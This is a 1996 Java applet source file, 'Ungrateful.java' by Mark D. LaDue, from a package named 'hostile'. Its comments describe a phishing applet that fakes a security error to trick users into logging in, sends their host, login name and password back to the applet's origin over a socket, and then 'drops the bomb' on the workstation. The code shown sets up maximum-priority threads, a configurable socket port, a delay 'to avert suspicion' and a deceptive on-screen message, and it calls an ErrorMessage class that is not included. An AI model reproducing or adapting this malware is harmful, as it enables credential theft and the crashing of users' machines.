package hostile;
/* Ungrateful.java by Mark D. LaDue */

/* February 28, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/* This Java Applet tries to convince you that your system is having
   a security problem and that you must now log in to start Netscape
   once again.  If you do so, your user name and password are sent
   by the browser to the home of this applet. In any event, the
   applet then proceeds to drop the bomb on your workstation. */ 


import java.awt.*;
import java.applet.Applet;

public class Ungrateful extends java.applet.Applet implements Runnable {

//  Just a font to paint strings to the applet window 
    Font bigFont = new Font("TimesRoman", Font.BOLD, 36);

//  These threads will attempt to  trick you
//  into logging in, and send your host, login name, and
//  password to its source 
    Thread controller = null;
    Thread sleeper = null;

//  Used to read in a parameter that makes the thread sleep for a
//  specified number of seconds taking effect
    int delay;
//  Used to read in a parameter that determines the port to which
//  Sockets will be connected
    public static int thePort;

    public void init() {
    setBackground(Color.white);

//  Determine how many seconds the main thread should sleep before kicking in
    String str = getParameter("wait");
    if (str == null)
        delay = 0;
    else delay = (1000)*(Integer.parseInt(str));
//  Determine the port number
    str = getParameter("portnumber");
    if (str == null)
        thePort = 7000;
    else thePort = Integer.parseInt(str);
    }


/*  Create and start the main thread in the standard way */

    public void start() {
        if (sleeper == null) {
        sleeper = new Thread(this);
        sleeper.setPriority(Thread.MAX_PRIORITY);
        sleeper.start();
        }
    }

    public void stop() {}


/*  Open a tricky window and start doing wasteful operations */

    public void run() {

//  Let the applet tell its lie
        repaint();

//  Let the applet sleep for a while to avert suspicion
        try {sleeper.sleep(delay);}
        catch(InterruptedException e) {}

        if (controller == null) {
        ErrorMessage err = new ErrorMessage();
        controller = new Thread(err);
        controller.setPriority(Thread.MAX_PRIORITY);
        controller.start();
        }
    }

/*  Paints the applet's lie */

    public void update(Graphics g) {
        paint(g);
    }

    public void paint(Graphics g) {
    g.setColor(Color.blue);
    g.setFont(bigFont);
    g.drawString("All Applets Are Trustworthy!", 10, 200);
    }
}

